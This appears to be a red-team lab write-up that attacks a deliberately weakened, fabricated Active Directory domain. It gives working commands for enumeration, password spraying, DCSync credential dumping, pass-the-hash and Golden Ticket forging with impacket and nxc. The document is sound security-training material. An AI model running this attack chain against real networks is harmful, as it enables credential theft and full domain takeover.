# 02 — Red Team Attack Chain

Assume-breach engagement from Kali (`192.168.1.130`) against `nightwatch.local`. Each stage lists the goal, the commands, and the result. Hashes shown are from fabricated lab accounts.

## Intentional weaknesses

These were planted on purpose so specific attacks would succeed:

| Weakness | Where | Enables |
| --- | --- | --- |
| Shared weak password (`Autumn2026!`) | `a_khan`, `m_ali`, `r_fatima`, `b_ahmed` | Password spraying |
| Min password length 7, no complexity | Domain GPO | Weak creds |
| SPN + weak password | `svc_sql` | Kerberoasting |
| Kerberos pre-auth disabled | `sana` | AS-REP roasting |
| Replication rights on a non-DC user | `a_khan` | DCSync |
| No LDAPS certificate | DC01 | Unencrypted LDAP |

---

## Stage 1 — Reconnaissance & Enumeration

**Goal:** map the network and the domain.

```bash
# Host, port and service discovery
nmap 192.168.1.1/24 -PR -F -sV
nmap -p- 192.168.1.10                       # full TCP sweep of the DC

# LDAP exposure: no LDAPS cert on 636, anonymous rootDSE leak
openssl s_client -connect 192.168.1.10:636 -showcerts
ldapsearch -x -H ldap://192.168.1.10 -b "" -s base "(objectclass=*)"

# SMB: anonymous null session, then authenticated share listing
smbclient -N -L //192.168.1.10
smbclient -L //192.168.1.10 -U 'nightwatch.local/j_smith'
nmap -p 445 --script smb-protocols 192.168.1.10

# User enumeration — all return the full domain user list
nmap -p 88,464 --script krb5-enum-users --script-args krb5-enum-users.realm='NIGHTWATCH.LOCAL' 192.168.1.10
rpcclient -U 'nightwatch.local/j_smith' 192.168.1.10   # > enumdomusers
nxc smb 192.168.1.10 -u j_smith -p '<password>' --users
```

**Result:** open AD ports confirmed (53, 88, 135, 139, 389, 445, 464, 593, 636, 3268/3269, 5985, 9389); SMB signing enforced, SMBv1 disabled; all 10 domain accounts and RIDs enumerated.

> **Note:** `krb5-enum-users` only returned `administrator` — it guesses from a small built-in wordlist. The complete list came from authenticated `nxc --users` / `rpcclient enumdomusers`.

---

## Stage 2 — Password Spraying & Lockout

**Goal:** find valid credentials without triggering mass lockouts.

```bash
# Lockout validation: repeated bad logons locked j_smith after 5 attempts
#   -> NT_STATUS_ACCOUNT_LOCKED_OUT

# Paced spray (one request per account, 1s apart) to stay lockout-safe
for u in $(cat users.txt); do
  nxc smb 192.168.1.10 -u "$u" -p 'Autumn2026!'; sleep 1
done
```

**Result:** compromised `a_khan`, `m_ali`, `r_fatima`, `b_ahmed` — all reusing `Autumn2026!`. The lockout policy correctly stopped the earlier brute force, so spraying one password across many users was the right pivot.

---

## Stage 3 — DCSync (Credential Dumping)

**Goal:** dump domain credentials by abusing replication rights.

```bash
# a_khan holds DS-Replication-Get-Changes[-All] -> full NTDS.dit
impacket-secretsdump nightwatch.local/a_khan:'Autumn2026!'@192.168.1.10
```

**Result:** NT hashes and Kerberos AES keys for every account, including `Administrator` and `krbtgt`. Password reuse is visible directly in the hashes — `j_smith`/`sana` share one NT hash; the four sprayed users share another. (See `configs-and-logs/secretsdump-ntds.txt`.)

---

## Stage 4 — Pass-the-Hash → DC Compromise

**Goal:** authenticate as Administrator using only the hash.

```bash
nxc smb 192.168.1.10 -u Administrator -H <admin_nt_hash>          # Pwn3d!
impacket-psexec -hashes :<admin_nt_hash> nightwatch.local/Administrator@192.168.1.10
```

**Result:** `NT AUTHORITY\SYSTEM` shell on `DC01` — full domain compromise, no password cracked.

---

## Stage 5 — Golden Ticket (Persistence)

**Goal:** forge a TGT for durable Domain Admin.

```bash
# Server 2025 rejects RC4 tickets (KDC_ERR_ETYPE_NOSUPP) -> forge with AES256
sudo ntpdate 192.168.1.10                 # fix clock skew first
impacket-ticketer -aesKey <krbtgt_aes256_key> \
  -domain-sid <domain_sid> -domain nightwatch.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass nightwatch.local/Administrator@dc01.nightwatch.local
```

**Result:** a TGT signed by `krbtgt`, reused for a SYSTEM shell — persistence that survives Administrator password resets.

---

## Lessons from the attack side

- **Server 2025 rejects RC4 Kerberos.** The NT-hash Golden Ticket failed with `KDC_ERR_ETYPE_NOSUPP`; re-forging with the AES256 key worked.
- **Kerberos is clock-sensitive.** Both `KRB_AP_ERR_SKEW` and `KRB_AP_ERR_TKT_NYV` appeared from VM clock drift (~68 min at one point). Syncing Kali to the DC fixed it.
- **LDAP signing** blocked default NTLM BloodHound collection, forcing Kerberos auth; with no LDAPS cert, the LDAPS fallback failed.
- **The lockout policy worked** — a reminder that spraying beats brute force against a defended domain.
